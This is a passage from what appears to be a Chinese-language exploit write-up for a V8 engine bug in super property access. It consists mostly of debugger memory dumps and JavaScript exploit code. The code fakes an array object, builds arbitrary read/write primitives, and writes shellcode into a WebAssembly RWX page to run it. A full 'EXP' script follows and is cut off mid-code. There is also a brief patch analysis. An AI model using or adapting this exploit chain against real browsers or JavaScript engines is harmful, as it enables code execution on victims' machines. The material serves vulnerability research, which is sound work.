counter: <span class="number">6</span></span><br><span class="line"></span><br><span class="line">gef➤  x/<span class="number">30</span>wx <span class="number">0x26b3083072a9</span><span class="number">-1</span></span><br><span class="line"><span class="number">0x26b3083072a8</span>:	<span class="number">0x08042119</span>	<span class="number">0x16080410</span>	<span class="number">0x0000043d</span>	<span class="number">0xc84017ff</span></span><br><span class="line"><span class="number">0x26b3083072b8</span>:	<span class="number">0x0814889d</span>	<span class="number">0x08307281</span>	<span class="number">0x08148b85</span>	<span class="number">0x080421b9</span> <span class="comment">// 第一个位置就是 prototype</span></span><br><span class="line"><span class="number">0x26b3083072c8</span>:	<span class="number">0x082d2b15</span>	<span class="number">0x00000000</span>	<span class="number">0x08042119</span>	<span class="number">0x16000303</span></span><br><span class="line"><span class="number">0x26b3083072d8</span>:	<span class="number">0x19000421</span>	<span class="number">0x08500bff</span>	<span class="number">0x08148bd1</span>	<span class="number">0x08148861</span></span><br><span class="line"><span class="number">0x26b3083072e8</span>:	<span class="number">0x08148bf1</span>	<span class="number">0x080421b9</span>	<span class="number">0x08242405</span>	<span class="number">0x082d2af9</span></span><br><span class="line"><span class="number">0x26b3083072f8</span>:	<span class="number">0x08042119</span>	<span class="number">0x14080808</span>	<span class="number">0x19c20423</span>	<span class="number">0x1a6003ff</span></span><br><span class="line"><span class="number">0x26b308307308</span>:	<span class="number">0x082c35ad</span>	<span class="number">0x082c3629</span>	<span class="number">0x080421c1</span>	<span class="number">0x080421b9</span></span><br><span class="line"><span class="number">0x26b308307318</span>:	<span class="number">0x08242405</span>	<span class="number">0x00000000</span></span><br><span class="line"></span><br><span class="line">gef➤  job <span class="number">0x0814889d</span></span><br><span class="line"><span class="number">0x26b30814889d</span>: [JS_OBJECT_TYPE]</span><br><span class="line"> - map: <span class="number">0x26b3083072d1</span> &lt;<span class="built_in">Map</span>(HOLEY_ELEMENTS)&gt; [FastProperties]</span><br><span class="line"> - prototype: <span class="number">0x26b308148bd1</span> &lt;JSFunction <span class="built_in">proto</span> (sfi = <span class="number">0x26b3082d2b49</span>)&gt;</span><br><span class="line"> - elements: <span class="number">0x26b30804222d</span> &lt;FixedArray[<span class="number">0</span>]&gt; [HOLEY_ELEMENTS]</span><br><span class="line"> - properties: <span class="number">0x26b308148aa1</span> &lt;PropertyArray[<span class="number">2</span>]&gt;</span><br><span class="line"> - All own <span class="built_in">properties</span> (excluding elements): &#123;</span><br><span class="line">    <span class="number">0x26b308044115</span>: [String] in ReadOnlySpace: <span class="meta">#constructor: 0x26b308148861 <span class="string">&lt;JSFunction B (sfi = 0x26b3082d26b5)&gt;</span> (const data field 0), location: properties[0]</span></span><br><span class="line">    <span class="number">0x26b3082d24cd</span>: [String] in OldSpace: <span class="meta">#m: 0x26b308148881 <span class="string">&lt;JSFunction m (sfi = 0x26b3082d26ed)&gt;</span> (const data field 1), location: properties[1]</span></span><br></pre></td></tr></table></figure>

<p>那么编写如下代码即可得到一个 <code>fake_arr_object</code> ：</p>
<figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> double_array = [<span class="number">1.1</span>,<span class="number">2.2</span>,<span class="number">3.3</span>,<span class="number">4.4</span>,<span class="number">5.5</span>,<span class="number">6.6</span>,<span class="number">7.7</span>,<span class="number">8.8</span>,<span class="number">9.9</span>,<span class="number">10.0</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">get_fake_arr_obj</span>(<span class="params">double_array</span>)&#123;</span><br><span class="line">	<span class="keyword">var</span> double_array_addr = <span class="title function_">addrof</span>(double_array);</span><br><span class="line">	<span class="keyword">var</span> double_array_map = <span class="title function_">read</span>(double_array_addr);</span><br><span class="line">	<span class="keyword">var</span> double_array_elements_addr = <span class="title function_">read</span>(double_array_addr + <span class="number">0x8</span>) - <span class="number">1</span>;</span><br><span class="line">	<span class="keyword">var</span> double_array_elements_map = <span class="title function_">read</span>(double_array_elements_addr);</span><br><span class="line">	<span class="keyword">var</span> double_array_map_map = <span class="title function_">read</span>(double_array_map - <span class="number">1</span>);</span><br><span class="line">	<span class="keyword">var</span> fake_length = <span class="number">0x1000</span>;</span><br><span class="line"></span><br><span class="line">	<span class="title function_">printhex</span>(<span class="string">&quot;double_array_addr&quot;</span>,double_array_addr);</span><br><span class="line">	<span class="title function_">printhex</span>(<span class="string">&quot;double_array_map&quot;</span>,double_array_map);</span><br><span class="line">	<span class="title function_">printhex</span>(<span class="string">&quot;double_array_elements_addr&quot;</span>,double_array_elements_addr);</span><br><span class="line">	<span class="title function_">printhex</span>(<span class="string">&quot;double_array_elements_map&quot;</span>,double_array_elements_map);</span><br><span class="line">	<span class="title function_">printhex</span>(<span class="string">&quot;double_array_map_map&quot;</span>,double_array_map_map);</span><br><span class="line"></span><br><span class="line">	double_array[<span class="number">0</span>] = <span class="title function_">i2f</span>(<span class="title class_">BigInt</span>(double_array_map_map) &lt;&lt; <span class="number">8n</span>); </span><br><span class="line">	double_array[<span class="number">1</span>] = <span class="number">0</span></span><br><span class="line">	double_array[<span class="number">2</span>] = <span class="title function_">i2f</span>(<span class="title class_">BigInt</span>(double_array_elements_addr + <span class="number">0x21</span>) &lt;&lt; <span class="number">8n</span>); </span><br><span class="line">	double_array[<span class="number">3</span>] = <span class="title function_">i2f</span>(<span class="title class_">BigInt</span>(double_array_map)); </span><br><span class="line">	double_array[<span class="number">4</span>] = <span class="title function_">i2f</span>(<span class="title class_">BigInt</span>(fake_length) &lt;&lt; <span class="number">32n</span> | <span class="title class_">BigInt</span>(double_array_elements_addr + <span class="number">0x31</span>));</span><br><span class="line">	double_array[<span class="number">5</span>] = <span class="title function_">i2f</span>(<span class="title class_">BigInt</span>(fake_length) &lt;&lt; <span class="number">32n</span> | <span class="title class_">BigInt</span>(double_array_elements_map));</span><br><span class="line">	double_array[<span class="number">6</span>] = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">class</span> <span class="title class_">B</span> <span class="keyword">extends</span> <span class="title class_ inherited__">Array</span>&#123;</span><br><span class="line">		<span class="title function_">constructor</span>(<span class="params"></span>)&#123;</span><br><span class="line">			<span class="variable language_">super</span>(<span class="number">1</span>,<span class="number">2</span>);</span><br><span class="line">			<span class="variable language_">this</span>.<span class="property">x0</span> = <span class="number">0x66666666</span> / <span class="number">2</span>;</span><br><span class="line">			<span class="variable language_">this</span>.<span class="property">x1</span> = <span class="number">0x66666666</span> / <span class="number">2</span>;</span><br><span class="line">			<span class="variable language_">this</span>.<span class="property">x2</span> = <span class="number">0x66666666</span> / <span class="number">2</span>;</span><br><span class="line">			<span class="variable language_">this</span>.<span class="property">x3</span> = (double_array_elements_addr + <span class="number">0x8</span> + <span class="number">2</span>) / <span class="number">2</span>;</span><br><span class="line"></span><br><span class="line">			&#125;</span><br><span class="line">		<span class="title function_">m</span>(<span class="params"></span>)&#123;</span><br><span class="line">			<span class="keyword">return</span> <span class="variable language_">super</span>.<span class="property"><span class="keyword">prototype</span></span>;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">var</span> b = <span class="keyword">new</span> <span class="title function_">B</span>();</span><br><span class="line"></span><br><span class="line">	<span class="keyword">function</span> <span class="title function_">f</span>(<span class="params"></span>)&#123;</span><br><span class="line">		<span class="keyword">const</span> proto = <span class="keyword">function</span> (<span class="params"></span>) &#123;&#125;;</span><br><span class="line">		B.<span class="property"><span class="keyword">prototype</span></span>.<span class="property">__proto__</span> = proto;</span><br><span class="line">		proto.<span class="property"><span class="keyword">prototype</span></span>;</span><br><span class="line">		<span class="keyword">return</span> b.<span class="title function_">m</span>();</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">for</span>(<span class="keyword">let</span> i=<span class="number">0</span>;i&lt;<span class="number">0x100</span>;i++)&#123;</span><br><span class="line">		<span class="keyword">var</span> fake_obj = <span class="title function_">f</span>();</span><br><span class="line">		<span class="keyword">if</span>(fake_obj.<span class="property">length</span> != <span class="literal">undefined</span>)&#123;</span><br><span class="line">			<span class="keyword">return</span> fake_obj;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>然后顺理成章弄出来 <code>read64、write64、arb_read</code> 和 <code>arb_write</code> ：</p>
<figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">read64</span>(<span class="params">addr</span>)&#123;</span><br><span class="line">	fake_arr_obj[<span class="number">0x11</span>] = <span class="title function_">i2f</span>((<span class="number">4n</span> &lt;&lt; <span class="number">32n</span>) | (<span class="title class_">BigInt</span>(addr - <span class="number">0x7</span>)));</span><br><span class="line">	<span class="keyword">return</span> <span class="title function_">f2i</span>(da[<span class="number">0</span>]);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">write64</span>(<span class="params">addr,data</span>)&#123;</span><br><span class="line">	fake_arr_obj[<span class="number">0x11</span>] = <span class="title function_">i2f</span>((<span class="number">4n</span> &lt;&lt; <span class="number">32n</span>) | (<span class="title class_">BigInt</span>(addr - <span class="number">0x7</span>)));</span><br><span class="line">	da[<span class="number">0</span>] = <span class="title function_">i2f</span>(<span class="title class_">BigInt</span>(data));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">arb_read</span>(<span class="params">addr</span>)&#123;</span><br><span class="line">	<span class="keyword">var</span> high_addr = addr &gt;&gt; <span class="number">32n</span>;</span><br><span class="line">	<span class="keyword">var</span> low_addr = addr &amp; <span class="number">0xffffffffn</span>;</span><br><span class="line">	fake_arr_obj[<span class="number">8</span>] = <span class="title function_">i2f</span>(<span class="title class_">BigInt</span>(low_addr) &lt;&lt; <span class="number">32n</span>);</span><br><span class="line">	fake_arr_obj[<span class="number">9</span>] = <span class="title function_">i2f</span>(((<span class="title function_">f2i</span>(fake_arr_obj[<span class="number">9</span>]) &gt;&gt; <span class="number">32n</span>) &lt;&lt; <span class="number">32n</span>) | <span class="title class_">BigInt</span>(high_addr));</span><br><span class="line">	<span class="keyword">let</span> dv = <span class="keyword">new</span> <span class="title class_">DataView</span>(ab); </span><br><span class="line">	<span class="keyword">return</span> <span class="title function_">f2i</span>(dv.<span class="title function_">getFloat64</span>(<span class="number">0</span>,<span class="literal">true</span>));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">arb_write</span>(<span class="params">addr,data</span>)&#123;</span><br><span class="line">	<span class="keyword">var</span> high_addr = addr &gt;&gt; <span class="number">32n</span>;</span><br><span class="line">	<span class="keyword">var</span> low_addr = addr &amp; <span class="number">0xffffffffn</span>;</span><br><span class="line">	fake_arr_obj[<span class="number">8</span>] = <span class="title function_">i2f</span>(<span class="title class_">BigInt</span>(low_addr) &lt;&lt; <span class="number">32n</span>);</span><br><span class="line">	fake_arr_obj[<span class="number">9</span>] = <span class="title function_">i2f</span>(((<span class="title function_">f2i</span>(fake_arr_obj[<span class="number">9</span>]) &gt;&gt; <span class="number">32n</span>) &lt;&lt; <span class="number">32n</span>) | <span class="title class_">BigInt</span>(high_addr));</span><br><span class="line">    <span class="keyword">let</span> ua = <span class="keyword">new</span> <span class="title class_">Uint8Array</span>(ab); </span><br><span class="line">    ua.<span class="title function_">set</span>(data);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>最后弹计算器：</p>
<figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> wasmCode = <span class="keyword">new</span> <span class="title class_">Uint8Array</span>([<span class="number">0</span>,<span class="number">97</span>,<span class="number">115</span>,<span class="number">109</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">133</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">96</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">127</span>,<span class="number">3</span>,<span class="number">130</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">4</span>,<span class="number">132</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">112</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">5</span>,<span class="number">131</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">6</span>,<span class="number">129</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">7</span>,<span class="number">145</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">2</span>,<span class="number">6</span>,<span class="number">109</span>,<span class="number">101</span>,<span class="number">109</span>,<span class="number">111</span>,<span class="number">114</span>,<span class="number">121</span>,<span class="number">2</span>,<span class="number">0</span>,<span class="number">4</span>,<span class="number">109</span>,<span class="number">97</span>,<span class="number">105</span>,<span class="number">110</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">10</span>,<span class="number">138</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">132</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">65</span>,<span class="number">42</span>,<span class="number">11</span>]);</span><br><span class="line"><span class="keyword">var</span> wasmModule = <span class="keyword">new</span> <span class="title class_">WebAssembly</span>.<span class="title class_">Module</span>(wasmCode);</span><br><span class="line"><span class="keyword">var</span> wasmInstance = <span class="keyword">new</span> <span class="title class_">WebAssembly</span>.<span class="title class_">Instance</span>(wasmModule, &#123;&#125;);</span><br><span class="line"><span class="keyword">var</span> f = wasmInstance.<span class="property">exports</span>.<span class="property">main</span>;</span><br><span class="line"><span class="keyword">var</span> wasm_instance_addr = <span class="title function_">addrof</span>(wasmInstance);</span><br><span class="line"><span class="title function_">printhex</span>(<span class="string">&quot;wasm_instance_addr&quot;</span>,wasm_instance_addr);</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> rwx_page_addr = <span class="title function_">read64</span>(wasm_instance_addr + <span class="number">0x68</span>);</span><br><span class="line"><span class="title function_">printhex</span>(<span class="string">&quot;rwx_page_addr&quot;</span>,rwx_page_addr);</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> sc = [<span class="number">72</span>, <span class="number">49</span>, <span class="number">201</span>, <span class="number">72</span>, <span class="number">129</span>, <span class="number">233</span>, <span class="number">247</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">72</span>, <span class="number">141</span>, <span class="number">5</span>, <span class="number">239</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">72</span>, <span class="number">187</span>, <span class="number">124</span>, <span class="number">199</span>, <span class="number">145</span>, <span class="number">218</span>, <span class="number">201</span>, <span class="number">186</span>, <span class="number">175</span>, <span class="number">93</span>, <span class="number">72</span>, <span class="number">49</span>, <span class="number">88</span>, <span class="number">39</span>, <span class="number">72</span>, <span class="number">45</span>, <span class="number">248</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">226</span>, <span class="number">244</span>, <span class="number">22</span>, <span class="number">252</span>, <span class="number">201</span>, <span class="number">67</span>, <span class="number">129</span>, <span class="number">1</span>, <span class="number">128</span>, <span class="number">63</span>, <span class="number">21</span>, <span class="number">169</span>, <span class="number">190</span>, <span class="number">169</span>, <span class="number">161</span>, <span class="number">186</span>, <span class="number">252</span>, <span class="number">21</span>, <span class="number">245</span>, <span class="number">32</span>, <span class="number">249</span>, <span class="number">247</span>, <span class="number">170</span>, <span class="number">186</span>, <span class="number">175</span>, <span class="number">21</span>, <span class="number">245</span>, <span class="number">33</span>, <span class="number">195</span>, <span class="number">50</span>, <span class="number">211</span>, <span class="number">186</span>, <span class="number">175</span>, <span class="number">93</span>, <span class="number">25</span>, <span class="number">191</span>, <span class="number">225</span>, <span class="number">181</span>, <span class="number">187</span>, <span class="number">206</span>, <span class="number">143</span>, <span class="number">25</span>, <span class="number">53</span>, <span class="number">148</span>, <span class="number">193</span>, <span class="number">150</span>, <span class="number">136</span>, <span class="number">227</span>, <span class="number">146</span>, <span class="number">103</span>, <span class="number">76</span>, <span class="number">233</span>, <span class="number">161</span>, <span class="number">225</span>, <span class="number">177</span>, <span class="number">217</span>, <span class="number">206</span>, <span class="number">49</span>, <span class="number">31</span>, <span class="number">199</span>, <span class="number">199</span>, <span class="number">141</span>, <span class="number">129</span>, <span class="number">51</span>, <span class="number">73</span>, <span class="number">82</span>, <span class="number">121</span>, <span class="number">199</span>, <span class="number">145</span>, <span class="number">218</span>, <span class="number">201</span>, <span class="number">186</span>, <span class="number">175</span>, <span class="number">93</span>];</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; sc.<span class="property">length</span> / <span class="number">8</span>; i++ )&#123;</span><br><span class="line">    <span class="title function_">arb_write</span>(rwx_page_addr + <span class="title class_">BigInt</span>(i) * <span class="number">8n</span> ,sc.<span class="title function_">slice</span>(i * <span class="number">8</span>,(i + <span class="number">1</span>) * <span class="number">8</span>));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title function_">f</span>();</span><br></pre></td></tr></table></figure>

<h1 id="Patch分析"><a href="#Patch分析" class="headerlink" title="Patch分析"></a>Patch分析</h1><p>前面提到的 <code>patch</code> 把漏洞路径中出错的 <code>receiver</code> 替换为了 <code>lookup_start_object</code> ，可以说明是正确的 <code>patch</code> 。</p>
<h1 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h1><figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> buf = <span class="keyword">new</span> <span class="title class_">ArrayBuffer</span>(<span class="number">16</span>);</span><br><span class="line"><span class="keyword">var</span> float64 = <span class="keyword">new</span> <span class="title class_">Float64Array</span>(buf);</span><br><span class="line"><span class="keyword">var</span> bigUint64 = <span class="keyword">new</span> <span class="title class_">BigUint64Array</span>(buf);</span><br><span class="line"><span class="keyword">var</span> <span class="title class_">Uint32</span> = <span class="keyword">new</span> <span class="title class_">Int32Array</span>(buf);</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">f2i</span>(<span class="params">f</span>)&#123;</span><br><span class="line">	float64[<span class="number">0</span>] = f;</span><br><span class="line">	<span class="keyword">return</span> bigUint64[<span class="number">0</span>];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">i2f</span>(<span class="params">i</span>)&#123;</span><br><span class="line">	bigUint64[<span class="number">0</span>] = i;</span><br><span class="line">	<span class="keyword">return</span> float64[<span class="number">0</span>];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">hex</span>(<span class="params">i</span>)&#123;</span><br><span class="line">	<span class="keyword">return</span> <span class="string">&#x27;0x&#x27;</span> + i.<span class="title function_">toString</span>(<span class="number">16</span>).<span class="title function_">padStart</span>(<span class="number">16</span>, <span class="string">&#x27;0&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">printhex</span>(<span class="params">name,value</span>)&#123;</span><br><span class="line">	<span class="variable language_">console</span>.<span class="title function_">log</span>(name + <span class="string">&quot; : &quot;</span> + <span class="title function_">hex</span>(value));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">leak_elements_ptr</span>(<span class="params"></span>)&#123;</span><br><span class="line">	<span class="keyword">class</span> <span class="title class_">O</span> <span class="keyword">extends</span> <span class="title class_ inherited__">Object</span>&#123;</span><br><span class="line">		<span class="title function_">constructor</span>(<span class="params"></span>)&#123;</span><br><span class="line">			<span class="variable language_">super</span>();</span><br><span class="line">			<span class="variable language_">this</span>.<span class="property">x0</span> = <span class="variable language_">this</span>;</span><br><span class="line">			<span class="variable language_">this</span>[<span class="number">0</span>] = <span class="number">0x66666666</span> / <span class="number">2</span>;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="title function_">m</span>(<span class="params"></span>)&#123;</span><br><span class="line">			<span class="keyword">return</span> <span class="variable language_">super</span>.<span class="property">length</span>;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">var</span> o = <span class="keyword">new</span> <span class="title function_">O</span>();</span><br><span class="line"></span><br><span class="line">	<span class="keyword">function</span> <span class="title function_">f</span>(<span class="params"></span>)&#123;</span><br><span class="line">		<span class="keyword">const</span> proto = <span class="keyword">new</span> <span class="title class_">String</span>(<span class="string">&quot;A&quot;</span>);</span><br><span class="line">		O.<span class="property"><span class="keyword">prototype</span></span>.<span class="property">__proto__</span> = proto;</span><br><span class="line">		proto.<span class="property">length</span>;</span><br><span class="line">		<span class="keyword">var</span> l = o.<span class="title function_">m</span>();</span><br><span class="line">		<span class="keyword">return</span> l;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">for</span>(<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; <span class="number">0x100</span>; i++)&#123;</span><br><span class="line">		<span class="keyword">let</span> length = <span class="title function_">f</span>();</span><br><span class="line">		<span class="keyword">if</span>(length != <span class="number">1</span>)&#123;</span><br><span class="line">			<span class="keyword">return</span> [o,length - <span class="number">1</span>];</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> [o,elements_ptr] = <span class="title function_">leak_elements_ptr</span>();</span><br><span class="line"><span class="title function_">printhex</span>(<span class="string">&quot;elements_ptr&quot;</span>,elements_ptr);</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">get_read_and_addrof</span>(<span class="params">o,elements_ptr</span>)&#123;</span><br><span class="line">	<span class="keyword">class</span> <span class="title class_">A</span> <span class="keyword">extends</span> <span class="title class_ inherited__">Array</span>&#123;</span><br><span class="line">		<span class="title function_">constructor</span>(<span class="params"></span>)&#123;</span><br><span class="line">			<span class="variable language_">super</span>(<span class="number">1</span>,<span class="number">2</span>);</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="title function_">m</span>(<span class="params"></span>)&#123;</span><br><span class="line">			<span class="keyword">return</span> <span class="variable language_">super</span>.<span class="property">length</span>;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">var</span> a = <span class="keyword">new</span> <span class="title function_">A</span>();</span><br><span class="line"></span><br><span class="line">	<span class="keyword">function</span> <span class="title function_">f</span>(<span class="params"></span>)&#123;</span><br><span class="line">		<span class="keyword">const</span> proto = <span 